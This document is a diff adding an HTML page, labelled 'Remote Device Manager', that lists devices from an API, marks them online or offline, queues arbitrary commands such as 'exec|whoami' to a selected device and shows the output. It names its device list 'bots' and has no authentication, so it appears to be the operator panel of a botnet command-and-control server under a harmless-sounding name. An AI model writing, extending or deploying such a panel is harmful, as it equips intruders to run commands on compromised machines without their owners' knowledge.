@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Device Manager</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: sans-serif; margin: 20px; background: #111; color: #eee; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+    th, td { padding: 8px; border-bottom: 1px solid #333; text-align: left; }
+    th { background: #222; }
+    .online { color: #0f0; font-weight: bold; }
+    .offline { color: #f00; }
+    textarea, input { width: 100%; background: #222; color: #eee; border: 1px solid #444; padding: 5px; }
+    button { padding: 5px 15px; margin: 5px; cursor: pointer; }
+    select { background: #222; color: #eee; padding: 5px; }
+    pre { background: #222; padding: 10px; min-height: 200px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+  <h1>Remote Device Manager</h1>
+  <select id="devList" onchange="loadResults()"><option>-- select device --</option></select>
+  <div style="margin:10px 0">
+    <input id="cmdInput" placeholder="exec|whoami" size="50">
+    <button onclick="sendCmd()">Send Command</button>
+  </div>
+  <pre id="output"></pre>
+
+  <script>
+    async function refresh() {
+      const res = await fetch('/api/devices');
+      const bots = await res.json();
+      const sel = document.getElementById('devList');
+      sel.innerHTML = '<option>-- select device --</option>';
+      bots.forEach(b => {
+        const online = (Date.now() - new Date(b.last_seen).getTime()) < 60000;
+        const opt = document.createElement('option');
+        opt.value = b.id;
+        opt.textContent = `${online ? '🟢' : '🔴'} ${b.hostname} (${b.os}) - ${new Date(b.last_seen).toLocaleTimeString()}`;
+        sel.appendChild(opt);
+      });
+    }
+
+    async function loadResults() {
+      const id = document.getElementById('devList').value;
+      if (!id || id.includes('--')) return;
+      const res = await fetch(`/api/devices/${id}/results`);
+      const data = await res.json();
+      document.getElementById('output').textContent = data.map(r => r.output).join('\n---\n');
+    }
+
+    async function sendCmd() {
+      const id = document.getElementById('devList').value;
+      const cmd = document.getElementById('cmdInput').value;
+      if (!id || !cmd) return alert('Select a device and enter a command');
+      await fetch(`/api/devices/${id}/command`, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({command: cmd})
+      });
+      alert('Command queued');
+    }
+
+    setInterval(refresh, 3000);
+    refresh();
+  </script>
+</body>
+</html>
